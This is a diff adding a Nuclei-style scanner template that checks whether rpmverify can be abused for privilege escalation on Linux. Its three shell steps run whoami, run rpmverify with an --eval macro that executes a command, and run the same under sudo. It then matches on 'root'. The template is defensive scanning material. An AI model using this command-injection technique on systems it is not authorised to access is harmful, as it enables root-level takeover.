@@ -1,0 +1,49 @@
+id: privesc-rpmverify
+
+info:
+  name: rpmverify - Privilege Escalation
+  author: daffainfo
+  severity: high
+  description: |
+    The rpmverify command is used to verify the integrity and authenticity of installed RPM packages on a Linux system. It checks the files in the installed packages against the information stored in the RPM database to detect any modifications or discrepancies. This helps ensure the security and stability of the system by identifying any unauthorized changes to the installed packages.
+  reference:
+    - https://gtfobins.github.io/gtfobins/rpmverify/
+  metadata:
+    verified: true
+    max-request: 3
+  tags: code,linux,rpmverify,privesc,local
+
+self-contained: true
+code:
+  - engine:
+      - sh
+      - bash
+    source: |
+      whoami
+
+  - engine:
+      - sh
+      - bash
+    source: |
+      rpmverify --eval '%(whoami 1>&2)'
+
+  - engine:
+      - sh
+      - bash
+    source: |
+      sudo rpmverify --eval '%(whoami 1>&2)'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: code_1_response
+        words:
+          - "root"
+        negative: true
+
+      - type: dsl
+        dsl:
+          - 'contains(code_2_response, "root")'
+          - 'contains(code_3_response, "root")'
+        condition: or
+# digest: 4b0a00483046022100a788526d96e52ff1cc3b258d770579cb7c114eae49babb2fac0c7651022a0463022100a1d63ea06bd3d9134854eeeba7417b3ee2af0150bccd9d351d69df47c6183075:922c64590222798bb761d5b6d8e72950
